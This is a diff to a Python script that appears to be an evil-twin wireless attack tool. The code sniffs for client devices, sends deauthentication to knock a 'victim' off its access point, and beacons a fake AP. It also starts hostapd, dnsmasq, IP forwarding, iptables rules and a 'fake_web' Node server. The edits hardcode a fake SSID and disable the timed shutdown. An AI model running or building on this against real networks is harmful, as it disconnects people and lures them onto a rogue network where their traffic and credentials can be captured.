@@ -54,7 +54,10 @@ def scan_for_users(iface, channel_range=3, timeout=10):
     print("Index\tUser MAC")
     for channel in range(1, channel_range):
         helper.scan_channels(iface, channel)
-        sniff(iface=iface, prn=users_handler, timeout=timeout)
+        try:
+            sniff(iface=iface, prn=users_handler, timeout=timeout)
+        except:
+            continue
 
 
 def deauthenticate_victim(iface, victim_mac_addr, ap_mac_addr):
@@ -131,13 +134,14 @@ def send_beacon(iface, ssid, victim_mac_addr, mac, infinite=True):
 
 def create_fake_ap(iface, victim, ap_name):
     global chosen_ap_mac
+    helper.reset()
     fake_mac_addr = RandMAC()
     Thread(target=send_beacon, args=(iface, ap_name, victim, fake_mac_addr)).start()
     print(f"\n*****\nFake AP Created:\nAP Name: {ap_name}\nMac Address: {fake_mac_addr}\n*****")
 
 
 def activate_fake_ap(iface, ssid):
-    helper.reset()
+    # helper.reset()
     helper.kill_processes()
     helper.create_hostapd_file(iface, ssid)
     helper.create_dnsmasq_file(iface)
@@ -146,8 +150,8 @@ def activate_fake_ap(iface, ssid):
     os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")  # Enabling IP forwarding: 1-enable, 0-disable
     helper.ip_tables_config()
     os.system("sudo dnsmasq -C conf_files/dnsmasq.conf")
-    os.system("sudo gnome-terminal -- sh -c 'node fake_web/index.js'")
     os.system("sudo hostapd conf_files/hostapd.conf -B")
+    os.system("sudo gnome-terminal -- sh -c 'node fake_web/index.js'")
     os.system("sudo route add default gw 10.0.0.1")
 
 
@@ -179,11 +183,12 @@ def network_attack(iface):
     deauthenticate_victim(iface, victim, chosen_ap_mac)
     change_modes.deactivate_monitor_mode(iface)
 
-    create_fake_ap(iface, victim, ap_name=chosen_ap[1])
-    activate_fake_ap(iface, ssid=chosen_ap[1])
+    # ap_name = chosen_ap[1]
+    create_fake_ap(iface, victim, ap_name="FakeAPHere!")
+    activate_fake_ap(iface, ssid="FakeAPHere!")
 
-    time.sleep(30)
-    deactivate_fake_ap()
+    # time.sleep(30)
+    # deactivate_fake_ap()
 
     # os.system(f"sudo iwconfig {iface} channel {chosen_ap[2]}")
     # helper.enable_nat("enp2s0f0")
